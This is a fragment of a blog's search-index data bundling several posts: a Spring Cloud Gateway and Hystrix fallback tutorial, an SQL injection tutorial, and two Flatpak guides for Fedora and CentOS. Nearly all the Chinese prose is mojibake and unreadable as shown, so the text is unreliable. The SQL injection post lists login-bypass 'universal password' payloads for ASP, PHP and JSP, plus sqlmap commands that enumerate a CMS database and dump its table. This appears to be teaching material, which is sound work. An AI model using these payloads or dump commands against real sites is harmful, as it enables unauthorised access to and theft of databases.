å¯ä»¥æä¾›ç†”æ–­ã€æœåŠ¡é™çº§å’Œå¿«é€Ÿå¤±è´¥ç­‰åŠŸèƒ½ã€‚Spring Cloud Gateway å¯¹ Hystrix è¿›è¡Œé›†æˆæä¾›è·¯ç”±å±‚é¢çš„æœåŠ¡ç†”æ–­å’Œé™çº§ï¼Œæœ€ç®€å•çš„ä½¿ç”¨åœºæ™¯æ˜¯å½“é€šè¿‡ Spring Cloud Gateway è°ƒç”¨åç«¯æœåŠ¡ï¼Œåç«¯æœåŠ¡ä¸€ç›´å‡ºç°å¼‚å¸¸ã€æœåŠ¡ä¸å¯ç”¨çš„çŠ¶æ€ã€‚æ­¤æ—¶ä¸ºäº†æé«˜ç”¨æˆ·ä½“éªŒï¼Œå°±éœ€è¦å¯¹æœåŠ¡é™çº§ï¼Œè¿”å›å‹å¥½çš„æç¤ºä¿¡æ¯ç»™æœåŠ¡æ¶ˆè´¹è€…ï¼Œåœ¨ä¿æŠ¤ç½‘å…³è‡ªèº«å¯ç”¨çš„åŒæ—¶ä¿æŠ¤åç«¯æœåŠ¡é«˜å¯ç”¨ã€‚ä¸‹é¢å°†ç»™å‡ºé…ç½®ç¤ºä¾‹ï¼Œç”±äºç¯‡å¹…æœ‰é™ï¼Œåªåˆ—å‡ºæ ¸å¿ƒçš„é…ç½®å†…å®¹å’Œä»£ç ã€‚ å·¥ç¨‹é‡Œçš„ pom.xml é…ç½®æ–‡ä»¶ï¼Œå¼•å…¥ spring-cloud-starter-gatewayã€spring-cloud-starter-netflix-hystrixï¼š 123456789101112&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt;&lt;/dependency&gt; å·¥ç¨‹é‡Œçš„å¯åŠ¨ä¸»ç±»ï¼š 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} å·¥ç¨‹é‡Œçš„ Fallback æ§åˆ¶å™¨ï¼š 12345678@RestControllerpublic class FallbackController { @GetMapping("/fallback") public String fallback() { return "Spring Cloud Gateway Fallbackï¼"; }} å·¥ç¨‹é‡Œçš„ application.xml é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ  Hystrix è¿‡æ»¤å™¨ç›¸å…³çš„é…ç½®ï¼Œå¹¶è®¾ç½® Hystrix çš„ fallbackcmd çš„è¶…æ—¶æ—¶é—´ï¼š 1234567891011121314151617181920212223spring: application: name: gateway-server cloud: gateway: routes: - id: hystrix_route predicates: - Path=/test/hystrix filters: - name: Hystrix # Hystrix Filter çš„åç§° args: # Hystrix é…ç½®å‚æ•° name: fallbackcmd # HystrixCommand çš„åå­— fallbackUri: forward:/fallback # fallback å¯¹åº”çš„ uri uri: http://127.0.0.1:8080/hystrix?isSleep=falsehystrix: command: fallbackcmd: execution: isolation: thread: timeoutInMilliseconds: 5000 # Hystrix çš„ fallbackcmd çš„è¶…æ—¶æ—¶é—´ ä¸‹ç¯‡ - Gateway å…¥é—¨æ•™ç¨‹ï¼ˆä¸­çº§ç¯‡ï¼‰ Gateway å…¥é—¨æ•™ç¨‹ - ä¸­çº§ç¯‡ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"Web å®‰å…¨ä¹‹ SQL æ³¨å…¥",url:"/posts/74f2b358.html",text:'SQL æ³¨å…¥æ¼æ´ è¯­è¨€æœ‰ä¸¤ç§ç±»å‹ï¼Œåˆ†åˆ«æ˜¯è§£é‡Šå‹è¯­è¨€å’Œç¼–è¯‘å‹è¯­è¨€ã€‚è§£é‡Šå‹è¯­è¨€æ˜¯ä¸€ç§åœ¨è¿è¡Œæ—¶ç”±ä¸€ä¸ªè¿è¡Œæ—¶ç»„ä»¶è§£é‡Šè¯­è¨€ä»£ç å¹¶æ‰§è¡Œå…¶ä¸­åŒ…å«çš„æŒ‡ä»¤çš„è¯­è¨€ã€‚è€Œç¼–è¯‘å‹è¯­è¨€æ˜¯ä»£ç åœ¨ç”Ÿæˆæ—¶è½¬æ¢ä¸ºæœºå™¨æŒ‡ä»¤ï¼Œç„¶ååœ¨è¿è¡Œæ—¶ç›´æ¥ç”±ä½¿ç”¨è¯¥è¯­è¨€çš„è®¡ç®—æœºæ‰§è¡Œè¿™äº›æŒ‡ä»¤ã€‚åœ¨è§£é‡Šå‹è¯­è¨€ä¸­ï¼Œå¦‚æœç¨‹åºä¸ç”¨æˆ·è¿›è¡Œäº¤äº’ï¼Œç”¨æˆ·å°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„è¾“å…¥æ¥æ‹¼æ¥åˆ°ç¨‹åºä¸­æ‰§è¡Œï¼Œä»è€Œä½¿å¾—ç¨‹åºä¾æ®ç”¨æˆ·è¾“å…¥æ‰§è¡Œæœ‰å¯èƒ½å­˜åœ¨æ¶æ„è¡Œä¸ºçš„ä»£ç ã€‚ä¾‹å¦‚ï¼šåœ¨ä¸ç”¨æˆ·äº¤äº’çš„ç¨‹åºä¸­ï¼Œç”¨æˆ·çš„è¾“å…¥æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œæ‰§è¡Œäº†ä¸åŸå®šè®¡åˆ’ä¸åŒçš„è¡Œä¸ºï¼Œä»è€Œäº§ç”Ÿäº† SQL æ³¨å…¥æ¼æ´ã€‚ ç™»å½• SQL è¯­å¥ï¼šselect * from admin where username = \'ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·å\' and password = \'ç”¨æˆ·è¾“å…¥çš„å¯†ç \'ï¼Œæ­¤æ—¶ç”¨æˆ·è¾“å…¥çš„å†…å®¹å¯ç”±ç”¨æˆ·è‡ªè¡Œæ§åˆ¶ï¼Œä¾‹å¦‚å¯ä»¥è¾“å…¥ \' or 1=1 --ç©ºæ ¼ SQL è¯­å¥ï¼šselect * from admin where username = \'\' or 1=1 -- \' and password = \'ç”¨æˆ·è¾“å…¥çš„å¯†ç \'ï¼Œå…¶ä¸­æ¡ä»¶ or 1=1 æ°¸è¿œä¸ºçœŸï¼Œ-- æ³¨é‡Šåè¾¹çš„å†…å®¹ä¸å†æ‰§è¡Œï¼Œå› æ­¤ SQL è¯­å¥æ‰§è¡Œåä¼šè¿”å› admin è¡¨ä¸­æ‰€æœ‰å­—æ®µçš„å†…å®¹ ä¸‡èƒ½å¯†ç  ä¸‡èƒ½å¯†ç æ˜¯å¦æœ‰æ•ˆï¼Œå¯ä»¥é€šè¿‡ Burp Suite å¹³å°è‡ªè¡ŒéªŒè¯ã€‚ 1234567891011121314151617181920212223242526ASPã€ASPXä¸‡èƒ½å¯†ç ï¼š&nbsp;&nbsp; 1ï¼š "or "a"="a&nbsp;&nbsp;&nbsp;2ï¼š \')or(\'a\'=\'a&nbsp;&nbsp;&nbsp;3ï¼šor 1=1--&nbsp;&nbsp;&nbsp;4ï¼š\'or 1=1--&nbsp;&nbsp;&nbsp;5ï¼ša\'or\' 1=1--&nbsp;&nbsp;&nbsp;6ï¼š "or 1=1--&nbsp;&nbsp;&nbsp;7ï¼š\'or\'a\'=\'a&nbsp;&nbsp;&nbsp;8ï¼š "or"="a\'=\'a&nbsp;&nbsp;&nbsp;9ï¼š\'or\'\'=\'&nbsp;&nbsp;&nbsp;10ï¼š\'or\'=\'or\'&nbsp;&nbsp;&nbsp;11: 1 or \'1\'=\'1\'=1&nbsp;&nbsp;&nbsp;12: 1 or \'1\'=\'1\' or 1=1&nbsp;&nbsp;&nbsp;13: \'OR 1=1%00&nbsp;&nbsp;&nbsp;14: "or 1=1%00&nbsp;&nbsp;&nbsp;15: \'xorPHPä¸‡èƒ½å¯†ç ï¼š&nbsp;&nbsp;&nbsp;\'or\'=\'or\'&nbsp;&nbsp;&nbsp;\'or 1=1/*&nbsp;&nbsp;&nbsp; User: somethingï¼ŒPassword: \' OR \'1\'=\'1JSPä¸‡èƒ½å¯†ç ï¼š&nbsp;&nbsp;&nbsp;1\'or\'1\'=\'1&nbsp;&nbsp;&nbsp;admin\' OR 1=1/*&nbsp;&nbsp;&nbsp;User: admin Password: 1\'or\'1\'=\'1 CMS SQL æ³¨å…¥æ¼æ´ CMS é€»è¾‘ï¼šindex.php æ˜¯é¦–é¡µï¼Œå…·æœ‰æ–‡ç« åˆ—è¡¨ï¼ˆé“¾æ¥åŒ…å«æ–‡ç«  idï¼‰ï¼Œarticles.php æ˜¯æ–‡ç« è¯¦ç»†é¡µï¼Œå…¶ URL ä¸º articles.php?id=æ–‡ç« id SQL æ³¨å…¥éªŒè¯ï¼š å½“æ–‡ç«  id ä¸º å•å¼•å·\'ã€and 1=1ã€and 1=2ï¼Œè‹¥é¡µé¢ä¸­å‡ºç° MySQL çš„é”™è¯¯æ—¥å¿—ä¿¡æ¯ï¼Œæˆ–è€…é¡µé¢ä¸æ˜¾ç¤ºä»»ä½•å†…å®¹ï¼Œåˆ™è¯æ˜è¯¥é¡µé¢å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ SQLMap æ¢æµ‹å‘½ä»¤ï¼š 1234æ¢æµ‹æ•°æ®åº“ï¼š sqlmap -u "192.168.1.104:8080/cms/articles.php?id=1" --dbsæ¢æµ‹æ•°æ®è¡¨ï¼š sqlmap -u "192.168.1.104:8080/cms/articles.php?id=1" -D cms --tablesæ¢æµ‹è¡¨å­—æ®µï¼š sqlmap -u "192.168.1.104:8080/cms/articles.php?id=1" -D cms -T articles --columnsæ¢æµ‹è¡¨å­—æ®µå€¼ï¼š sqlmap -u "192.168.1.104:8080/cms/articles.php?id=1" -D cms -T articles -C id,title,content --dump var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç½‘ç»œå®‰å…¨"},{title:"Fedora30 æ„å»º Flatpak åº”ç”¨",url:"/posts/5bd408ba.html",text:'ç³»ç»Ÿç¯å¢ƒ 12Fedora release 30 (Thirty)Linux Fedora30 3.10.0-1062.1.1.el7.x86_64 #1 SMP Fri Sep 13 22:55:44 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Flatpak å®‰è£… 12345678910111213# å®‰è£…flatpak# yum install flatpak flatpak-builder# æ·»åŠ flathubä»“åº“# flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo# æ·»åŠ GNOMEç¨³å®šç‰ˆçš„ä»“åº“ï¼ˆå·²å¤±æ•ˆï¼‰# wget https://sdk.gnome.org/keys/gnome-sdk.gpg# flatpak remote-add --gpg-import=gnome-sdk.gpg gnome https://sdk.gnome.org/repo/# flatpak remote-add --gpg-import=gnome-sdk.gpg --if-not-exists gnome-apps https://sdk.gnome.org/repo-apps/# æ·»åŠ GNOMEæ¯æ—¥æ„å»ºç‰ˆçš„ä»“åº“ï¼ˆæœ€æ–°ï¼‰# flatpak remote-add --if-not-exists gnome-nightly https://nightly.gnome.org/gnome-nightly.flatpakrepo æ„å»º Peek Peek æ˜¯ä¸€æ¬¾ AUR ä¸Šäººæ°”å¾ˆé«˜çš„å±å¹•å½•åƒå·¥å…·ï¼Œå¯ä¿å­˜å½•åƒä¸º gif åŠ¨å›¾å’Œå…¼å®¹äº html5 çš„ webm è§†é¢‘ï¼Œå¯ä»¥è¿è¡Œåœ¨ GNOME æ¡Œé¢ç¯å¢ƒä¸‹ã€‚Peek å®˜æ–¹æä¾›çš„æºç é‡Œï¼Œé»˜è®¤åŒ…å«äº†æ„å»º Flatpak åº”ç”¨çš„ YAML æ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œæ„å»ºæ“ä½œå³å¯ã€‚æ„å»º Peek ä¹‹å‰ï¼Œéœ€è¦ä¿è¯ Flatpak çš„ç‰ˆæœ¬ &gt;= 1.4.0ï¼Œå¦‚æœç³»ç»Ÿçš„ Flatpak ç‰ˆæœ¬ä¸æ»¡è¶³è¦æ±‚ï¼ŒåŒæ—¶åˆä¸èƒ½å‡çº§ Flatpak çš„ç‰ˆæœ¬ï¼Œé‚£ä¹ˆå¯å‚è€ƒæœ¬æ–‡æœ€åç»™å‡ºçš„è§£å†³æ–¹æ¡ˆã€‚ 1234567891011121314151617181920212223242526# æŸ¥çœ‹flatpakçš„ç‰ˆæœ¬# flatpak --version# ä¸‹è½½æºç # wget -O peek-1.4.0.tar.gz https://github.com/phw/peek/archive/1.4.0.tar.gz# è§£å‹æ–‡ä»¶# tar -xvf peek-1.4.0.tar.gz# è¿›å…¥æ„å»ºç›®å½•# cd peek-1.4.0/data/flatpak/# åˆ é™¤æ—§çš„åº”ç”¨æ–‡ä»¶# rm -rf *.flatpak# å®‰è£…è¿è¡Œæ—¶ä¾èµ–gnome-platform-3.34ï¼ˆè€—æ—¶è¾ƒé•¿ï¼‰ï¼Œä¾èµ–flatpakçš„ç‰ˆæœ¬ &gt;= 1.4.0# flatpak install org.gnome.Sdk/x86_64/3.34# flatpak install org.gnome.Platform-3.34# æ‰§è¡Œæ„å»ºè„šæœ¬# ./build.sh# æˆåŠŸæ„å»ºåº”ç”¨åï¼Œé»˜è®¤ä¼šç”Ÿæˆ".flatpakref"åç¼€çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼špeek-stable.flatpakref# å®‰è£…æ„å»ºç”Ÿæˆåº”ç”¨# flatpak install xxxx.flatpakref æ„å»º Peek çš„ YAML æ–‡ä»¶ æ„å»º Flatpak åº”ç”¨ç¦»ä¸å¼€ YAML é…ç½®æ–‡ä»¶ï¼Œä½œç”¨ç±»ä¼¼ Docker çš„ docker-fileï¼Œå¦‚æœæƒ³è‡ªå®šä¹‰ Peek çš„æ„å»ºè¿‡ç¨‹ï¼Œå¯ä»¥å‚è€ƒä¸‹é¢ YAML é…ç½®æ–‡ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127app-id: com.uploadedlobster.peekruntime: org.gnome.Platformruntime-version: \'3.34\'sdk: org.gnome.Sdksdk-extensions: - org.freedesktop.Sdk.Extension.rust-stablebranch: stablecommand: peekfinish-args: - --share=ipc - --socket=x11 - --env=GDK_BACKEND=x11 - --socket=wayland - --talk-name=org.freedesktop.FileManager1 - --talk-name=org.gnome.Shell.Screencast - --filesystem=home - --filesystem=xdg-run/dconf - --filesystem=~/.config/dconf:ro - --talk-name=ca.desrt.dconf - --env=DCONF_USER_CONFIG_DIR=.config/dconf - --env=LD_LIBRARY_PATH=/app/libbuild-options: cflags: -O2 -g -fstack-protector-strong -D_FORTIFY_SOURCE=2 cxxflags: -O2 -g -fstack-protector-strong -D_FORTIFY_SOURCE=2 ldflags: -fstack-protector-strong -Wl,-z,relro,-z,now append-path: /usr/lib/sdk/rust-stable/bincleanup: - /include - /lib/pkgconfig - /share/gtk-doc - "*.la"modules: - name: ffmpeg config-opts: - --disable-debug - --disable-static - --enable-gpl - --enable-libvpx - --enable-libx264 - --enable-shared - --enable-libxcb - --enable-libxcb-xfixes - --disable-libxcb-shape - --disable-ffplay - --disable-ffprobe - --disable-doc - --disable-everything - --enable-bsf=vp9_superframe - --enable-decoder=libvpx_vp9 - --enable-decoder=png - --enable-decoder=rawvideo - --enable-encoder=apng - --enable-encoder=ffvhuff - --enable-encoder=gif - --enable-encoder=libvpx_vp9 - --enable-encoder=libx264 - --enable-encoder=png - --enable-demuxer=image2 - --enable-demuxer=matroska - --enable-muxer=apng - --enable-muxer=gif - --enable-muxer=image2 - --enable-muxer=mp4 - --enable-muxer=webm - --enable-filter=crop - --enable-filter=fps - --enable-filter=palettegen - --enable-filter=paletteuse - --enable-filter=scale - --enable-protocol=file - --enable-indev=xcbgrab sources: - type: archive url: https://ffmpeg.org/releases/ffmpeg-4.2.1.tar.xz sha256: cec7c87e9b60d174509e263ac4011b522385fd0775292e1670ecc1180c9bb6d4 modules: - name: yasm cleanup: "*" sources: - type: archive url: http://www.tortall.net/projects/yasm/releases/yasm-1.3.0.tar.gz sha256: 3dce6601b495f5b3d45b59f7d2492a340ee7e84b5beca17e48f862502bd5603f - name: libx264 config-opts: - --enable-pic - --enable-shared sources: - type: git url: https://git.videolan.org/git/x264.git commit: 72db437770fd1ce3961f624dd57a8e75ff65ae0b cleanup: - /bin/x264 - name: gifski buildsystem: simple build-options: build-args: - --share=network skip-arches: - aarch64 - arm sources: - type: archive url: https://github.com/ImageOptim/gifski/archive/0.9.1.tar.gz sha256: f39a6e510e825bf4b43aebd1d7fb581d3b59a11bf7521bf6f507d4b0fa684b76 build-commands: - cargo build --release --features=openmp --verbose - install -Dm755 target/release/gifski /app/bin/gifski - name: peek buildsystem: meson config-opts: - --buildtype=release build-options: cflags: -L/app/lib sources: - type: git url: ../.. branch: 1.4.0 modules: - name: keybinder3 sources: - type: archive url: https://github.com/kupferlauncher/keybinder/releases/download/keybinder-3.0-v0.3.2/keybinder-3.0-0.3.2.tar.gz sha256: e6e3de4e1f3b201814a956ab8f16dfc8a262db1937ff1eee4d855365398c6020Â© 2019 GitHub, Inc. è§£å†³æ„å»º Peek æ—¶ä¾èµ– Flatpak çš„ç‰ˆæœ¬å¿…é¡»å¤§äº 1.4.0 çš„é—®é¢˜ 123# æ›´æ”¹YAMLé…ç½®æ–‡ä»¶ï¼ŒæŒ‡å®šorg.gnome.Platformä¸ºå…¶ä»–ä½ç‰ˆæœ¬runtime: org.gnome.Platformruntime-version: \'3.32\' var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Centos7 ä¸‹ Flatpak çš„å®‰è£…ä¸ä½¿ç”¨",url:"/posts/61c6d2c8s.html",text:'Flatpak ä»‹ç» Flatpakï¼ˆå‰ä¸–ä¸º xdg-appï¼‰æ˜¯ä¸€ç§ç”¨äºæ„å»ºã€åˆ†å‘ã€å®‰è£…å’Œè¿è¡Œåº”ç”¨ç¨‹åºçš„æŠ€æœ¯ï¼Œç±»ä¼¼çš„åº”ç”¨ç¨‹åºå®¹å™¨æŠ€æœ¯è¿˜æœ‰å¤§åé¼é¼çš„ Snapã€AppImageã€‚å®ƒä¸»è¦é’ˆå¯¹çš„æ˜¯ Linux æ¡Œé¢ï¼Œé€šè¿‡åœ¨æ²™ç®±ä¸­éš”ç¦»åº”ç”¨ç¨‹åºæ¥æé«˜ Linux æ¡Œé¢çš„å®‰å…¨æ€§ï¼Œå…è®¸åº”ç”¨ç¨‹åºå®‰è£…åœ¨ä»»ä½• Linux å‘è¡Œç‰ˆä¸Šï¼Œè€Œä¸”æ”¯æŒç”¨æˆ·åœ¨åŒä¸€ä¸ªç³»ç»Ÿä¸­å®‰è£…åŒä¸€åº”ç”¨ç¨‹åºçš„å¤šä¸ªç‰ˆæœ¬ã€‚å¦‚æœéœ€è¦æ›´å¤šçš„ Flatpak åº”ç”¨ï¼Œå¯ä»¥ä» Flathub åº”ç”¨å•†åº—ç›´æ¥è·å–ã€‚ Flatpak å®‰è£… 12345678910111213# å®‰è£…flatpak# yum install flatpak flatpak-builder# æ·»åŠ flathubä»“åº“# flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo# æ·»åŠ GNOMEç¨³å®šç‰ˆçš„ä»“åº“ï¼ˆå·²å¤±æ•ˆï¼‰# wget https://sdk.gnome.org/keys/gnome-sdk.gpg# flatpak remote-add --gpg-import=gnome-sdk.gpg gnome https://sdk.gnome.org/repo/# flatpak remote-add --gpg-import=gnome-sdk.gpg --if-not-exists gnome-apps https://sdk.gnome.org/repo-apps/# æ·»åŠ GNOMEæ¯æ—¥æ„å»ºç‰ˆçš„ä»“åº“ï¼ˆæœ€æ–°ï¼‰# flatpak remote-add --if-not-exists gnome-nightly https://nightly.gnome.org/gnome-nightly.flatpakrepo Flatpak ä»“åº“ç®¡ç†å‘½ä»¤ 1234567891011121314# æŸ¥çœ‹ä»“åº“åˆ—è¡¨# flatpak remotes# åˆ é™¤ç‰¹å®šçš„ä»“åº“# flatpak remote-delete gnome-apps# æŸ¥çœ‹æ‰€æœ‰ä»“åº“çš„å¯ç”¨è½¯ä»¶åŒ…åˆ—è¡¨ï¼ˆåŒ…æ‹¬åº”ç”¨ç¨‹åºå’Œè¿è¡Œæ—¶ç¯å¢ƒï¼‰# flatpak remote-ls | head -20# æŸ¥çœ‹æ‰€æœ‰ä»“åº“çš„åº”ç”¨ç¨‹åºåˆ—è¡¨# flatpak remote-ls --app# æŸ¥çœ‹ç‰¹å®šä»“åº“çš„åº”ç”¨ç¨‹åºåˆ—è¡¨# flatpak remote-ls gnome-apps --app Flatpak åº”ç”¨ç®¡ç†å‘½ä»¤ 12345678910111213141516171819202122232425262728293031# ä»ç‰¹å®šçš„ä»“åº“å®‰è£…åº”ç”¨ç¨‹åºï¼ˆç³»ç»Ÿçº§å®‰è£…-SystemWideï¼‰# flatpak install flathub com.leinardi.gwe# ä»ç‰¹å®šçš„ä»“åº“å®‰è£…åº”ç”¨ç¨‹åºï¼ˆç”¨æˆ·çº§å®‰è£…-PerUserï¼‰# flatpak install --user flathub com.leinardi.gwe# è¿è¡Œå·²å®‰è£…çš„åº”ç”¨ç¨‹åº# flatpak run com.leinardi.gwe# æŸ¥çœ‹å·²å®‰è£…åº”ç”¨ç¨‹åºçš„è¯¦ç»†ä¿¡æ¯# flatpak info com.leinardi.gwe# æŸ¥çœ‹å·²å®‰è£…çš„è½¯ä»¶åŒ…åˆ—è¡¨ï¼ˆåŒ…æ‹¬åº”ç”¨ç¨‹åºå’Œè¿è¡Œæ—¶ç¯å¢ƒï¼‰# flatpak list# æŸ¥çœ‹å·²å®‰è£…çš„åº”ç”¨ç¨‹åº# flatpak list --app# æ›´æ–°æ‰€æœ‰å·²å®‰è£…çš„åº”ç”¨ç¨‹åº# flatpak update# æ›´æ–°ç‰¹å®šå·²å®‰è£…çš„åº”ç”¨ç¨‹åº# flatpak update com.leinardi.gwe# å¸è½½ç‰¹å®šçš„åº”ç”¨ç¨‹åº# flatpak uninstall com.leinardi.gwe# ç¦»çº¿å®‰è£…ï¼ˆä»Flathubä¸‹è½½åº”ç”¨ç¨‹åºçš„å®‰è£…åŒ…ï¼Œç„¶ååœ¨æœ¬åœ°ç¦»çº¿å®‰è£…ï¼Œå‰ææ˜¯ç³»ç»Ÿå·²å®‰è£…ï¼ˆæˆ–å·²åŒ…å«ï¼‰è¯¥åº”ç”¨ç¨‹åºæ‰€éœ€çš„è¿è¡Œæ—¶ç¯å¢ƒï¼‰# flatpak install com.leinardi.gwe.flatpak# æç¤ºï¼šflatpakçš„å‘½ä»¤ï¼Œå¤§å¤šæ•°éƒ½æ”¯æŒ"--user"ä¸"--system"å‚æ•°ï¼Œå‰è€…ä»£è¡¨ç”¨æˆ·çº§çš„æ“ä½œï¼Œåè€…ä»£è¡¨ç³»ç»Ÿçº§çš„æ“ä½œï¼Œé»˜è®¤å€¼ä¸º"--system" (adsbygoogle = window.adsbygoogle || []).push({}); Flatpak é…ç½®ä»£ç† è‹¥ Flatpak çš„ä¸‹è½½é€Ÿåº¦æ¯”è¾ƒæ…¢ï¼Œæ­¤æ—¶å¯ä»¥é…ç½® Flatpak ä½¿ç”¨ä»£ç†ï¼Œä»¥æ­¤åŠ å¿«ä¸‹è½½é€Ÿåº¦ã€‚ 123456# æ·»åŠ ç¯å¢ƒå˜é‡# export http_proxy=http://127.0.0.1:8118# export https_proxy=http://127.0.0.1:8118# æµ‹è¯•ä»£ç†# curl -I www.google.com 123# ç§»é™¤ç¯å¢ƒå˜é‡# unset http_proxy# unset https_proxy Flatpak ç›¸å…³ç›®å½•è¯´æ˜ 121. æ™®é€šç”¨æˆ·è¿è¡ŒFlatpakåº”ç”¨åè‡ªåŠ¨ç”Ÿæˆçš„ç¼“å­˜ç›®å½•ä¸ºï¼š~/.var/app2. ç³»ç»Ÿçº§å®‰è£…Flatpakåº”ç”¨åï¼Œå…¶åº”ç”¨çš„å®‰è£…æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸ºï¼š/var/lib/flatpak/appã€/var/lib/flatpak/runtime åˆ›å»º Flatpak åº”ç”¨çš„å¿«æ·æ–¹å¼ 123456# æ­£å¸¸æƒ…å†µä¸‹å®‰è£…Flatpakåº”ç”¨åï¼Œä¼šè‡ªåŠ¨åˆ›å»ºå¿«æ·æ–¹å¼ï¼Œå¦‚æœæ²¡æœ‰åˆ™å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æ‰‹åŠ¨åˆ›å»ºå¿«æ·æ–¹å¼# åˆ›å»ºåº”ç”¨com.leinardi.gweï¼ˆç³»ç»Ÿçº§å®‰è£…ï¼‰çš„å¿«æ·æ–¹å¼# ln -s /var/lib/flatpak/app/com.leinardi.gwe/x86_64/stable/fd76222820472b18cf6d6733e8549da7b25f14266cde1d4ba7d6975f983db7f8/files/share/applications/com.leinardi.gwe.desktop /usr/share/applications/gwe.desktop# é€šè¿‡æŒ‰ä¸‹ Alt + F2 å¿«æ·é”®ï¼Œç„¶åè¾“å…¥ r é‡å¯ç•Œé¢ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº --&gt; é™„ä»¶ --&gt; GreenWithEnvyï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼å¯åŠ¨åº”ç”¨ Deepin-Wine å®‰è£… Deepinï¼ˆæ·±åº¦ï¼‰é»˜è®¤æ”¯æŒ Flatpakï¼Œå› æ­¤å¯ä»¥é€šè¿‡ Flatpak å®‰è£… Deepin æ„å»ºæ‰“åŒ…å¥½çš„ Flatpak åº”ç”¨ã€‚é¦–å…ˆä½¿ç”¨ Flatpak å®‰è£… Deepin-Wine å®¹å™¨ï¼Œç„¶åå°±å¯ä»¥å®‰è£… Deepin å®˜æ–¹æä¾›çš„ TIMã€å¾®ä¿¡ã€è¿…é›·ç­‰å¸¸ç”¨åº”ç”¨äº†ã€‚å®æµ‹è™½ç„¶éƒ¨åˆ†åº”ç”¨å¯ä»¥å®‰è£…å¹¶ä½¿ç”¨ï¼Œä½†å®é™…ä½¿ç”¨èµ·æ¥ä¸å¤ªç¨³å®šã€‚å…·ä½“å®‰è£…æ­¥éª¤å¯å‚è€ƒï¼šflatpak-deepinwine-giteeã€Deepin-Wine ç¯å¢ƒçš„ Ubuntu/Debian ç§»æ¤ç‰ˆ å‚è€ƒåšå®¢ Flatpak è½¯ä»¶åŒ…æ–°æ‰‹æŒ‡å— Linux å®‰è£…æ¨¡å¼ AppImage,Flatpak,Snap æ•´ç† çœŸæœ‰ç”¨ï¼ŸSnap å’Œ Flatpak é€šåƒæ‰€æœ‰å‘è¡Œç‰ˆçš„æ‰“åŒ…æ–¹å¼ ä¸‰æ¬¾æ–°æ˜Ÿ Linux è§£å†³æ–¹æ¡ˆï¼šSnappyã€Flatpak å’Œ AppImage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Consul å…¥é—¨æ•™ç¨‹ - 